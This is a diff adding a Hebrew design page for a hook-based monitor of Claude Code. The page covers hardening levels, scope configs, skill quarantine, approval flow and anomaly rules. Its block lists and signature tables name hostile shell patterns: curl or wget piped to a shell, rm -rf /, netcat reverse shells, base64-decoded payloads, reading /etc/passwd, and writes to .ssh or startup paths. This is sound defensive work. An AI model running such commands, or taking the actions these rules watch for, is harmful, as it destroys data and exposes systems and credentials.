+      "approved_at": "2026-04-01T10:00:00Z",
+      "last_verified": "2026-04-06T08:00:00Z",
+      "status": "APPROVED",
+      "scan_results": { "injection": false, "commands": false, "structure": true }
+    },
+    {
+      "name": "unknown-skill-v2.md",
+      "path": "C:/Users/Eran/.claude/skills/unknown-skill-v2.md",
+      "sha256": "x9z1a2b3c4...",
+      "approved_by": null,
+      "status": "QUARANTINE",
+      "scan_results": { "injection": true, "hidden_chars": 14 }
+    }
+  ]
+}
+  </pre>
+</div>
+
+<div class="hw-note" style="background:rgba(239,68,68,0.07); border-color:rgba(239,68,68,0.25); color:#fca5a5; margin-bottom:12px;">
+  🔴 סקיל שנכשל ב-SCAN-01/02/03 → נכנס להסגר אוטומטי + CRITICAL alert + לא פועל עד אישור ידני.
+</div>
+<div class="hw-note" style="margin-bottom:0;">
+  💡 בדיקת Hash רצה גם בכל הפעלה של Claude Code — לא רק בהתקנה. שינוי בסקיל קיים = CRITICAL מיידי.
+</div>
+
+<div style="height:32px;"></div>
+
+<!-- HARDENING -->
+<div class="section-title">הקשחה — Hardening Levels</div>
+
+<!-- Hardening concept -->
+<div class="hw-card" style="margin-bottom:16px; border-color:rgba(239,68,68,0.2);">
+  <div class="hw-card-title" style="color:#fca5a5;">מה זה הקשחה?</div>
+  <div style="font-size:13px;color:var(--muted);line-height:1.9;margin-top:8px;">
+    Claude מקבל הגדרת <strong style="color:var(--text);">תיקיית פרויקט</strong> — וכל גישה מחוצה לה נחסמת, מדווחת, או מצריכה אישור.
+    כמו Firewall Zone — אתה מגדיר מה "פנים" ומה "חוץ".
+  </div>
+</div>
+
+<!-- 4 hardening levels -->
+<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:14px;margin-bottom:16px;">
+
+  <!-- Level 0 -->
+  <div class="hw-card" style="border-top:3px solid var(--muted);">
+    <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px;">
+      <div style="background:rgba(107,114,128,0.15);border-radius:8px;width:40px;height:40px;display:flex;align-items:center;justify-content:center;font-size:18px;">🔓</div>
+      <div>
+        <div style="font-weight:800;font-size:14px;">Level 0 — OFF</div>
+        <div style="font-size:11px;color:var(--muted2);">ניטור בלבד, ללא הגבלה</div>
+      </div>
+    </div>
+    <div style="font-size:12px;color:var(--muted);line-height:1.8;">
+      ✅ קריאה — כל מקום<br>
+      ✅ כתיבה — כל מקום<br>
+      ✅ WebFetch — כל URL<br>
+      ✅ Bash — כל פקודה<br>
+      ℹ️ הכל מתועד בלבד
+    </div>
+  </div>
+
+  <!-- Level 1 -->
+  <div class="hw-card" style="border-top:3px solid var(--yellow);">
+    <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px;">
+      <div style="background:rgba(245,158,11,0.15);border-radius:8px;width:40px;height:40px;display:flex;align-items:center;justify-content:center;font-size:18px;">⚠️</div>
+      <div>
+        <div style="font-weight:800;font-size:14px;">Level 1 — SOFT</div>
+        <div style="font-size:11px;color:var(--yellow);">התראה על חריגה מהפרויקט</div>
+      </div>
+    </div>
+    <div style="font-size:12px;color:var(--muted);line-height:1.8;">
+      ✅ קריאה — כל מקום<br>
+      ⚠️ כתיבה מחוץ לפרויקט → alert<br>
+      ⚠️ WebFetch URL חדש → alert<br>
+      ✅ Bash — כל פקודה<br>
+      📱 Telegram על כל חריגה
+    </div>
+  </div>
+
+  <!-- Level 2 -->
+  <div class="hw-card" style="border-top:3px solid var(--orange);">
+    <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px;">
+      <div style="background:rgba(249,115,22,0.15);border-radius:8px;width:40px;height:40px;display:flex;align-items:center;justify-content:center;font-size:18px;">🔒</div>
+      <div>
+        <div style="font-weight:800;font-size:14px;">Level 2 — STRICT</div>
+        <div style="font-size:11px;color:var(--orange);">חסימה + אישור ידני</div>
+      </div>
+    </div>
+    <div style="font-size:12px;color:var(--muted);line-height:1.8;">
+      ✅ קריאה — בתיקיית פרויקט בלבד<br>
+      ❌ כתיבה מחוץ לפרויקט → חסום<br>
+      ⚠️ WebFetch — Whitelist בלבד<br>
+      ❌ Bash חשוד → חסום<br>
+      🔐 חריגה → אישור ידני נדרש
+    </div>
+  </div>
+
+  <!-- Level 3 -->
+  <div class="hw-card" style="border-top:3px solid var(--red);">
+    <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px;">
+      <div style="background:rgba(239,68,68,0.15);border-radius:8px;width:40px;height:40px;display:flex;align-items:center;justify-content:center;font-size:18px;">🔐</div>
+      <div>
+        <div style="font-weight:800;font-size:14px;">Level 3 — LOCKDOWN</div>
+        <div style="font-size:11px;color:var(--red);">נעילה מלאה — פרויקט בלבד</div>
+      </div>
+    </div>
+    <div style="font-size:12px;color:var(--muted);line-height:1.8;">
+      ✅ קריאה — בתיקיית פרויקט בלבד<br>
+      ✅ כתיבה — בתיקיית פרויקט בלבד<br>
+      ❌ WebFetch — חסום לחלוטין<br>
+      ❌ Bash — חסום לחלוטין<br>
+      🚨 כל חריגה = CRITICAL + חסום
+    </div>
+  </div>
+
+</div>
+
+<!-- Project folder config -->
+<div class="hw-card" style="margin-bottom:16px;">
+  <div class="hw-card-title">הגדרת תיקיית פרויקט — Project Scope</div>
+  <div style="font-size:11px;color:var(--muted2);margin-bottom:10px;">נשמר ב: <span style="font-family:monospace;color:var(--accent);">~/.ccsm/project-scope.json</span></div>
+  <pre style="font-size:11px; color:var(--muted); line-height:1.8; font-family:monospace; background:rgba(0,0,0,0.3); padding:14px; border-radius:8px;">
+{
+  "hardening_level": 2,
+  "project_roots": [
+    "C:/Claude-Repo/local-apps/next-stop-flights/",
+    "C:/Claude-Repo/agents/EHZ-SEC-AI/"
+  ],
+  "allowed_read_outside": [
+    "C:/Users/Eran/.claude/",
+    "C:/Users/Eran/AppData/Local/Temp/"
+  ],
+  "allowed_write_outside": [],
+  "url_whitelist": [
+    "github.com",
+    "ehz-server.duckdns.org",
+    "npmjs.com",
+    "vercel.app"
+  ],
+  "bash_blocked_patterns": [
+    "curl.*|.*sh",
+    "rm -rf /",
+    "wget.*|.*bash"
+  ],
+  "require_approval_for": [
+    "write_outside_project",
+    "new_domain_fetch",
+    "bash_with_sudo"
+  ]
+}
+  </pre>
+</div>
+
+<!-- Decision matrix -->
+<div class="hw-card" style="margin-bottom:16px; overflow-x:auto;">
+  <div class="hw-card-title">מטריצת החלטות — לפי Level ו-Tool</div>
+  <table style="width:100%;border-collapse:collapse;font-size:12px;margin-top:10px;min-width:580px;">
+    <thead>
+      <tr style="border-bottom:1px solid var(--border2);">
+        <th style="padding:9px 10px;text-align:right;color:var(--muted2);">פעולה</th>
+        <th style="padding:9px 10px;text-align:center;color:var(--muted2);">Level 0</th>
+        <th style="padding:9px 10px;text-align:center;color:var(--yellow);">Level 1</th>
+        <th style="padding:9px 10px;text-align:center;color:var(--orange);">Level 2</th>
+        <th style="padding:9px 10px;text-align:center;color:var(--red);">Level 3</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr style="border-bottom:1px solid var(--border);">
+        <td style="padding:8px 10px;font-weight:600;">Read — בתיקיית פרויקט</td>
+        <td style="padding:8px;text-align:center;color:var(--green);">✅</td>
+        <td style="padding:8px;text-align:center;color:var(--green);">✅</td>
+        <td style="padding:8px;text-align:center;color:var(--green);">✅</td>
+        <td style="padding:8px;text-align:center;color:var(--green);">✅</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border);">
+        <td style="padding:8px 10px;font-weight:600;">Read — מחוץ לפרויקט</td>
+        <td style="padding:8px;text-align:center;color:var(--green);">✅</td>
+        <td style="padding:8px;text-align:center;color:var(--green);">✅</td>
+        <td style="padding:8px;text-align:center;color:var(--yellow);">⚠️ alert</td>
+        <td style="padding:8px;text-align:center;color:var(--red);">❌ חסום</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border);">
+        <td style="padding:8px 10px;font-weight:600;">Write — בתיקיית פרויקט</td>
+        <td style="padding:8px;text-align:center;color:var(--green);">✅</td>
+        <td style="padding:8px;text-align:center;color:var(--green);">✅</td>
+        <td style="padding:8px;text-align:center;color:var(--green);">✅</td>
+        <td style="padding:8px;text-align:center;color:var(--green);">✅</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border);">
+        <td style="padding:8px 10px;font-weight:600;">Write — מחוץ לפרויקט</td>
+        <td style="padding:8px;text-align:center;color:var(--green);">✅</td>
+        <td style="padding:8px;text-align:center;color:var(--yellow);">⚠️ alert</td>
+        <td style="padding:8px;text-align:center;color:var(--orange);">🔐 אישור</td>
+        <td style="padding:8px;text-align:center;color:var(--red);">❌ חסום</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border);">
+        <td style="padding:8px 10px;font-weight:600;">WebFetch — URL מ-Whitelist</td>
+        <td style="padding:8px;text-align:center;color:var(--green);">✅</td>
+        <td style="padding:8px;text-align:center;color:var(--green);">✅</td>
+        <td style="padding:8px;text-align:center;color:var(--green);">✅</td>
+        <td style="padding:8px;text-align:center;color:var(--red);">❌ חסום</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border);">
+        <td style="padding:8px 10px;font-weight:600;">WebFetch — URL חדש</td>
+        <td style="padding:8px;text-align:center;color:var(--green);">✅</td>
+        <td style="padding:8px;text-align:center;color:var(--yellow);">⚠️ alert</td>
+        <td style="padding:8px;text-align:center;color:var(--orange);">🔐 אישור</td>
+        <td style="padding:8px;text-align:center;color:var(--red);">❌ חסום</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border);">
+        <td style="padding:8px 10px;font-weight:600;">Bash — פקודה רגילה</td>
+        <td style="padding:8px;text-align:center;color:var(--green);">✅</td>
+        <td style="padding:8px;text-align:center;color:var(--green);">✅</td>
+        <td style="padding:8px;text-align:center;color:var(--green);">✅</td>
+        <td style="padding:8px;text-align:center;color:var(--red);">❌ חסום</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border);">
+        <td style="padding:8px 10px;font-weight:600;">Bash — sudo / חשוד</td>
+        <td style="padding:8px;text-align:center;color:var(--green);">✅ log</td>
+        <td style="padding:8px;text-align:center;color:var(--yellow);">⚠️ alert</td>
+        <td style="padding:8px;text-align:center;color:var(--red);">❌ חסום</td>
+        <td style="padding:8px;text-align:center;color:var(--red);">❌ חסום</td>
+      </tr>
+      <tr>
+        <td style="padding:8px 10px;font-weight:600;">Agent Tool / MCP</td>
+        <td style="padding:8px;text-align:center;color:var(--green);">✅</td>
+        <td style="padding:8px;text-align:center;color:var(--yellow);">⚠️ alert</td>
+        <td style="padding:8px;text-align:center;color:var(--orange);">🔐 אישור</td>
+        <td style="padding:8px;text-align:center;color:var(--red);">❌ חסום</td>
+      </tr>
+    </tbody>
+  </table>
+</div>
+
+<!-- Approval flow -->
+<div class="hw-card" style="margin-bottom:16px;">
+  <div class="hw-card-title">זרימת אישור ידני — Level 2 (אישור נדרש)</div>
+  <pre style="font-size:12px; color:var(--muted); line-height:2; font-family:monospace; margin-top:8px;">
+Claude מנסה לכתוב מחוץ לפרויקט
+          ↓
+  hook מזהה חריגה
+          ↓
+  Claude מקבל: "⛔ BLOCKED — מחוץ לפרויקט"
+          ↓
+  Telegram לערן:
+  "🔐 אישור נדרש
+   Claude רוצה לכתוב ל: C:/Windows/System32/
+   פקודה: [תוכן הפקודה]
+   /approve_123 — אשר   /deny_123 — דחה"
+          ↓
+  ערן לוחץ /approve → Claude ממשיך ✅
+  ערן לוחץ /deny   → Claude חסום   ❌
+  אין תגובה 60s    → דחייה אוטומטית ❌
+  </pre>
+</div>
+
+<!-- Per-project config -->
+<div class="hw-card" style="margin-bottom:16px;">
+  <div class="hw-card-title">הגדרה לפי פרויקט — כל פרויקט עם Level שונה</div>
+  <pre style="font-size:11px; color:var(--muted); line-height:1.8; font-family:monospace; background:rgba(0,0,0,0.3); padding:14px; border-radius:8px;">
+{
+  "projects": [
+    {
+      "name": "next-stop-flights",
+      "root": "C:/Claude-Repo/local-apps/next-stop-flights/",
+      "hardening": 2,
+      "allowed_urls": ["ehz-server.duckdns.org", "vercel.com"]
+    },
+    {
+      "name": "EHZ-SEC-AI",
+      "root": "C:/Claude-Repo/agents/EHZ-SEC-AI/",
+      "hardening": 1,
+      "allowed_urls": ["github.com", "npmjs.com"]
+    },
+    {
+      "name": "research",
+      "root": "C:/Claude-Repo/research/",
+      "hardening": 3,
+      "allowed_urls": []
+    }
+  ],
+  "default_hardening": 1
+}
+  </pre>
+</div>
+
+<div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:0;">
+  <div class="hw-note" style="background:rgba(16,185,129,0.07);border-color:rgba(16,185,129,0.25);color:var(--green);">
+    💡 ניתן לשנות Level בזמן אמת מה-Dashboard או בפקודת Telegram: /hardening 2
+  </div>
+  <div class="hw-note" style="background:rgba(239,68,68,0.07);border-color:rgba(239,68,68,0.25);color:#fca5a5;">
+    🔐 Level 3 מיועד לפרויקטים רגישים / עבודה לא מקוונת — חוסם הכל חוץ מתיקיית הפרויקט
+  </div>
+</div>
+
+<div style="height:32px;"></div>
+
+<!-- ANOMALY RULES -->
+<div class="section-title">מנגנון זיהוי אנומליות — Anomaly Detection Rules</div>
+
+<!-- Severity legend -->
+<div style="display:flex; gap:10px; flex-wrap:wrap; margin-bottom:20px;">
+  <div style="display:flex;align-items:center;gap:6px;background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.3);border-radius:8px;padding:6px 14px;font-size:12px;font-weight:700;color:#ef4444;">🔴 CRITICAL — Telegram מיידי</div>
+  <div style="display:flex;align-items:center;gap:6px;background:rgba(249,115,22,0.1);border:1px solid rgba(249,115,22,0.3);border-radius:8px;padding:6px 14px;font-size:12px;font-weight:700;color:#f97316;">🟠 HIGH — Telegram</div>
+  <div style="display:flex;align-items:center;gap:6px;background:rgba(245,158,11,0.1);border:1px solid rgba(245,158,11,0.3);border-radius:8px;padding:6px 14px;font-size:12px;font-weight:700;color:#f59e0b;">🟡 MEDIUM — לוג בלבד</div>
+  <div style="display:flex;align-items:center;gap:6px;background:rgba(99,102,241,0.1);border:1px solid rgba(99,102,241,0.3);border-radius:8px;padding:6px 14px;font-size:12px;font-weight:700;color:#818cf8;">🔵 LOW — לוג בלבד</div>
+  <div style="display:flex;align-items:center;gap:6px;background:var(--panel);border:1px solid var(--border);border-radius:8px;padding:6px 14px;font-size:12px;font-weight:700;color:var(--muted);">⚪ INFO — לוג בלבד</div>
+</div>
+
+<!-- Rule types grid -->
+<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:16px;margin-bottom:16px;">
+
+  <!-- Bash Rules -->
+  <div class="hw-card">
+    <div class="hw-card-title">חוק סוג 1 — Bash Signature Rules</div>
+    <table style="width:100%;border-collapse:collapse;font-size:12px;">
+      <tr style="border-bottom:1px solid var(--border);">
+        <th style="text-align:right;padding:6px 4px;color:var(--muted);font-weight:600;">דפוס</th>
+        <th style="text-align:right;padding:6px 4px;color:var(--muted);font-weight:600;">סיבה</th>
+        <th style="text-align:center;padding:6px 4px;color:var(--muted);font-weight:600;">רמה</th>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border);">
+        <td style="padding:6px 4px;font-family:monospace;color:#fca5a5;">curl.*|.*sh</td>
+        <td style="padding:6px 4px;color:var(--muted);">הורדה + הרצה עיוורת</td>
+        <td style="text-align:center;">🔴</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border);">
+        <td style="padding:6px 4px;font-family:monospace;color:#fca5a5;">wget.*|.*bash</td>
+        <td style="padding:6px 4px;color:var(--muted);">הורדה + הרצה עיוורת</td>
+        <td style="text-align:center;">🔴</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border);">
+        <td style="padding:6px 4px;font-family:monospace;color:#fca5a5;">rm -rf /</td>
+        <td style="padding:6px 4px;color:var(--muted);">מחיקת root</td>
+        <td style="text-align:center;">🔴</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border);">
+        <td style="padding:6px 4px;font-family:monospace;color:#fca5a5;">mkfs / dd if=</td>
+        <td style="padding:6px 4px;color:var(--muted);">פורמט/כתיבה לדיסק</td>
+        <td style="text-align:center;">🔴</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border);">
+        <td style="padding:6px 4px;font-family:monospace;color:#fdba74;">base64 -d</td>
+        <td style="padding:6px 4px;color:var(--muted);">decode payload מוסתר</td>
+        <td style="text-align:center;">🟠</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border);">
+        <td style="padding:6px 4px;font-family:monospace;color:#fdba74;">nc -</td>
+        <td style="padding:6px 4px;color:var(--muted);">netcat — reverse shell?</td>
+        <td style="text-align:center;">🟠</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border);">
+        <td style="padding:6px 4px;font-family:monospace;color:#fdba74;">python -c exec</td>
+        <td style="padding:6px 4px;color:var(--muted);">הרצת קוד inline</td>
+        <td style="text-align:center;">🟠</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border);">
+        <td style="padding:6px 4px;font-family:monospace;color:#fdba74;">/etc/passwd</td>
+        <td style="padding:6px 4px;color:var(--muted);">גישה לקובץ סיסמאות</td>
+        <td style="text-align:center;">🟠</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border);">
+        <td style="padding:6px 4px;font-family:monospace;color:#fde68a;">sudo</td>
+        <td style="padding:6px 4px;color:var(--muted);">הרמת הרשאות</td>
+        <td style="text-align:center;">🟡</td>
+      </tr>
+      <tr>
+        <td style="padding:6px 4px;font-family:monospace;color:#fde68a;">crontab / chmod 777</td>
+        <td style="padding:6px 4px;color:var(--muted);">persistence / הרשאות</td>
+        <td style="text-align:center;">🟡</td>
+      </tr>
+    </table>
+  </div>
+
+  <!-- WebFetch + Write Rules -->
+  <div class="hw-card">
+    <div class="hw-card-title">חוק סוג 2 — Context Rules (WebFetch / Write / Read)</div>
+    <table style="width:100%;border-collapse:collapse;font-size:12px;">
+      <tr style="border-bottom:1px solid var(--border);">
+        <th style="text-align:right;padding:6px 4px;color:var(--muted);font-weight:600;">Tool + דפוס</th>
+        <th style="text-align:right;padding:6px 4px;color:var(--muted);font-weight:600;">סיבה</th>
+        <th style="text-align:center;padding:6px 4px;color:var(--muted);font-weight:600;">רמה</th>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border);">
+        <td style="padding:6px 4px;font-family:monospace;color:#fca5a5;">WebFetch: IP URL</td>
+        <td style="padding:6px 4px;color:var(--muted);">URL עם IP ישיר</td>
+        <td style="text-align:center;">🟠</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border);">
+        <td style="padding:6px 4px;font-family:monospace;color:#fca5a5;">WebFetch: .ru/.tk/.ml</td>
+        <td style="padding:6px 4px;color:var(--muted);">TLD חשוד</td>
+        <td style="text-align:center;">🟠</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border);">
+        <td style="padding:6px 4px;font-family:monospace;color:#fca5a5;">WebFetch: pastebin</td>
+        <td style="padding:6px 4px;color:var(--muted);">paste site — payload?</td>
+        <td style="text-align:center;">🟠</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border);">
+        <td style="padding:6px 4px;font-family:monospace;color:#fde68a;">WebFetch: HTTP</td>
+        <td style="padding:6px 4px;color:var(--muted);">לא מוצפן</td>
+        <td style="text-align:center;">🟡</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border);">
+        <td style="padding:6px 4px;font-family:monospace;color:#fde68a;">WebFetch: ngrok.io</td>
+        <td style="padding:6px 4px;color:var(--muted);">tunnel חשוד</td>
+        <td style="text-align:center;">🟡</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border);">
+        <td style="padding:6px 4px;font-family:monospace;color:#fca5a5;">Write: /.ssh/</td>
+        <td style="padding:6px 4px;color:var(--muted);">כתיבה לתיקיית SSH</td>
+        <td style="text-align:center;">🟠</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border);">
+        <td style="padding:6px 4px;font-family:monospace;color:#fca5a5;">Write: /etc/</td>
+        <td style="padding:6px 4px;color:var(--muted);">כתיבה לקבצי מערכת</td>
+        <td style="text-align:center;">🟠</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border);">
+        <td style="padding:6px 4px;font-family:monospace;color:#fde68a;">Write: .bashrc/.zshrc</td>
+        <td style="padding:6px 4px;color:var(--muted);">שינוי הגדרות shell</td>
+        <td style="text-align:center;">🟡</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border);">
+        <td style="padding:6px 4px;font-family:monospace;color:#fde68a;">Write: startup/autorun</td>
+        <td style="padding:6px 4px;color:var(--muted);">persistence?</td>
+        <td style="text-align:center;">🟡</td>
+      </tr>
+      <tr>
+        <td style="padding:6px 4px;font-family:monospace;color:#c4b5fd;">Bash: pipes > 3</td>
+        <td style="padding:6px 4px;color:var(--muted);">שרשרת פקודות ארוכה</td>
+        <td style="text-align:center;">🔵</td>
+      </tr>
+    </table>
+  </div>
+
+  <!-- Behavioral Rules -->
+  <div class="hw-card">
+    <div class="hw-card-title">חוק סוג 3 — Behavioral Rules (דפוס לאורך זמן)</div>
+    <div style="font-size:11px;color:var(--muted);margin-bottom:8px;">רצים על Collector — ניתוח היסטורי</div>
+    <table style="width:100%;border-collapse:collapse;font-size:12px;">
+      <tr style="border-bottom:1px solid var(--border);">
+        <th style="text-align:right;padding:6px 4px;color:var(--muted);font-weight:600;">תנאי</th>
+        <th style="text-align:right;padding:6px 4px;color:var(--muted);font-weight:600;">חשד</th>
+        <th style="text-align:center;padding:6px 4px;color:var(--muted);font-weight:600;">רמה</th>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border);">
+        <td style="padding:6px 4px;color:var(--text);">&gt;20 WebFetch / 60 שניות</td>
+        <td style="padding:6px 4px;color:var(--muted);">data exfiltration?</td>
+        <td style="text-align:center;">🟠</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border);">
+        <td style="padding:6px 4px;color:var(--text);">&gt;50 Read / 5 דקות</td>
+        <td style="padding:6px 4px;color:var(--muted);">file scanning?</td>
+        <td style="text-align:center;">🟡</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border);">
+        <td style="padding:6px 4px;color:var(--text);">אותו domain &gt;10 פעמים</td>
+        <td style="padding:6px 4px;color:var(--muted);">reconnaissance?</td>
+        <td style="text-align:center;">🟡</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border);">
+        <td style="padding:6px 4px;color:var(--text);">3+ CRITICAL באותה session</td>
+        <td style="padding:6px 4px;color:var(--muted);">מתקפה מתמשכת?</td>
+        <td style="text-align:center;">🔴</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border);">
+        <td style="padding:6px 4px;color:var(--text);">Tool חדש — לא נראה 7 ימים</td>
+        <td style="padding:6px 4px;color:var(--muted);">unusual usage</td>
+        <td style="text-align:center;">⚪</td>
+      </tr>
+      <tr>
+        <td style="padding:6px 4px;color:var(--text);">פעילות בשעות לא רגילות</td>
+        <td style="padding:6px 4px;color:var(--muted);">off-hours activity</td>
+        <td style="text-align:center;">🔵</td>
+      </tr>
+    </table>
+  </div>
+
+  <!-- Whitelist -->
+  <div class="hw-card" style="border-color:rgba(16,185,129,0.3);">
+    <div class="hw-card-title" style="color:var(--green);">Whitelist — אין התראה על אלה</div>
+    <div style="font-size:11px;color:var(--muted);margin-bottom:10px;">מגדיר אתה — מניעת False Positives</div>
+    <div style="font-size:12px;line-height:2;color:var(--muted);">
+      <div style="color:var(--text);font-weight:600;margin-bottom:4px;">דומיינים מורשים:</div>
+      <div style="font-family:monospace;color:var(--green);">github.com</div>
+      <div style="font-family:monospace;color:var(--green);">ehz-server.duckdns.org</div>
+      <div style="font-family:monospace;color:var(--green);">vercel.app</div>
+      <div style="font-family:monospace;color:var(--green);">npmjs.com</div>
+      <br>
+      <div style="color:var(--text);font-weight:600;margin-bottom:4px;">פקודות מורשות:</div>
+      <div style="font-family:monospace;color:var(--green);">git status / git log / git diff</div>
+      <div style="font-family:monospace;color:var(--green);">npm install / npm run</div>
+      <div style="font-family:monospace;color:var(--green);">ls / pwd / cat / echo</div>
+      <br>
+      <div style="color:var(--text);font-weight:600;margin-bottom:4px;">נתיבים מורשים:</div>
+      <div style="font-family:monospace;color:var(--green);">C:/Claude-Repo/</div>
+      <div style="font-family:monospace;color:var(--green);">C:/Users/Eran/AppData/Local/Temp/</div>
+    </div>
+  </div>
+
+</div>
+
+<!-- Flow diagram -->
+<div class="hw-card" style="margin-bottom:16px;">
+  <div class="hw-card-title">זרימת בדיקה — כל tool call</div>
+  <pre style="font-size:12px; color:var(--muted); line-height:1.9; font-family:monospace; margin-top:8px;">
+Claude מבצע tool call
+        ↓
+  hook.js מופעל (&lt;5ms)
+        ↓
+  בדיקת Whitelist → מורשה? → שלח event INFO → Claude ממשיך ✅
+        ↓ לא מורשה
+  בדיקת Signature Rules (Bash / WebFetch / Write)
+        ↓
+  בדיקת Context Rules
+        ↓
+  חישוב Severity (CRITICAL / HIGH / MEDIUM / LOW / INFO)
+        ↓
+  שליחה async ל-Collector (לא חוסם!)
+        ↓              ↓
+  CRITICAL/HIGH    MEDIUM ומטה
+        ↓              ↓
+  Telegram Alert   לוג בשקט
+        ↓              ↓
+  Claude ממשיך ✅  Claude ממשיך ✅
+
+  * שלב ג בלבד: CRITICAL → process.exit(1) → Claude נחסם
+  </pre>
+</div>
+
+<div class="hw-note" style="background:rgba(239,68,68,0.07); border-color:rgba(239,68,68,0.25); color:#fca5a5; margin-bottom:12px;">
+  🔴 CRITICAL = Telegram מיידי בכל מקרה — גם בשלב א' (ניטור בלבד). חסימה רק בשלב ג' ורק לפי הגדרתך.
+</div>
+
+<div class="hw-note" style="margin-bottom: 0;">
+  💡 כל החוקים וה-Whitelist ניתנים לעריכה מה-Dashboard — ללא צורך לגעת בקוד.
+</div>
+
+<div style="height:32px;"></div>
+
+<!-- KAMATERA LAB -->
+<div class="section-title">סביבת בדיקות שלב ב — Kamatera Cloud Lab</div>
+
+<!-- 3 servers -->
+<div class="hw-grid" style="margin-bottom:16px;">
+
+  <div class="hw-card" style="border-top:3px solid #6366f1;">
+    <div class="hw-card-title" style="color:#a5b4fc;">שרת 1 — CORP-DC01</div>
+    <div class="hw-row"><span class="hw-label">תפקיד</span><span class="hw-value" style="color:#a5b4fc;">Domain Controller + DNS</span></div>
+    <div class="hw-row"><span class="hw-label">OS</span><span class="hw-value warn">Windows Server 2022</span></div>
+    <div class="hw-row"><span class="hw-label">RAM</span><span class="hw-value warn">4 GB</span></div>
+    <div class="hw-row"><span class="hw-label">IP פנימי</span><span class="hw-value ok">192.168.0.1</span></div>
+    <div class="hw-row"><span class="hw-label">עלות</span><span class="hw-value warn">~$30/חודש</span></div>
+    <div style="margin-top:12px; font-size:11px; color:var(--muted); line-height:1.9;">
+      ✔ AD DS + DNS<br>
+      ✔ Domain: ehzlab.local<br>
+      ✔ OU: CCSM-Users<br>
+      ✔ קבוצות: CCSM-Admins, CCSM-Analysts<br>
+      ✔ Service Account: ccsm-svc<br>
+      ✔ GPO: CCSM-Deploy<br>
+      ✔ 3–5 משתמשי בדיקה
+    </div>
+  </div>
+
+  <div class="hw-card" style="border-top:3px solid #10b981;">
+    <div class="hw-card-title" style="color:#6ee7b7;">שרת 2 — CORP-WS01</div>
+    <div class="hw-row"><span class="hw-label">תפקיד</span><span class="hw-value" style="color:#6ee7b7;">תחנת עבודה מנוטרת</span></div>
+    <div class="hw-row"><span class="hw-label">OS</span><span class="hw-value ok">Ubuntu 22.04 LTS</span></div>
+    <div class="hw-row"><span class="hw-label">RAM</span><span class="hw-value ok">2 GB</span></div>
+    <div class="hw-row"><span class="hw-label">IP פנימי</span><span class="hw-value ok">192.168.0.2</span></div>
+    <div class="hw-row"><span class="hw-label">עלות</span><span class="hw-value ok">~$9/חודש</span></div>
+    <div style="margin-top:12px; font-size:11px; color:var(--muted); line-height:1.9;">
+      ✔ Claude Code (npm -g)<br>
+      ✔ Node.js 20 LTS<br>
+      ✔ CCSM Agent + hooks<br>
+      ✔ Join Domain (realmd + sssd)<br>
+      ✔ משתמש: testuser01@ehzlab.local
+    </div>
+  </div>
+
+  <div class="hw-card" style="border-top:3px solid #0ea5e9;">
+    <div class="hw-card-title" style="color:#7dd3fc;">שרת 3 — CCSM-SRV</div>
+    <div class="hw-row"><span class="hw-label">תפקיד</span><span class="hw-value" style="color:#7dd3fc;">Collector + Dashboard</span></div>
+    <div class="hw-row"><span class="hw-label">OS</span><span class="hw-value ok">Ubuntu 22.04 LTS</span></div>
+    <div class="hw-row"><span class="hw-label">RAM</span><span class="hw-value ok">2 GB</span></div>
+    <div class="hw-row"><span class="hw-label">IP פנימי</span><span class="hw-value ok">192.168.0.10</span></div>
+    <div class="hw-row"><span class="hw-label">עלות</span><span class="hw-value ok">~$9/חודש</span></div>
+    <div style="margin-top:12px; font-size:11px; color:var(--muted); line-height:1.9;">
+      ✔ Node.js 20 LTS<br>
+      ✔ PostgreSQL 15+<br>
+      ✔ nginx + SSL<br>
+      ✔ PM2<br>
+      ✔ Port 3010 (Collector)<br>
+      ✔ Port 3011 (Dashboard)
+    </div>
+  </div>
+
+</div>
+
+<!-- Cost summary -->
+<div class="hw-card" style="margin-bottom:16px;">
+  <div class="hw-card-title">סיכום עלויות — חשבון Kamatera חדש</div>
+  <div class="hw-row"><span class="hw-label">CORP-DC01 (Windows)</span><span class="hw-value warn">~$30/חודש</span></div>
+  <div class="hw-row"><span class="hw-label">CORP-WS01 (Ubuntu)</span><span class="hw-value ok">~$9/חודש</span></div>
+  <div class="hw-row"><span class="hw-label">CCSM-SRV (Ubuntu)</span><span class="hw-value ok">~$9/חודש</span></div>
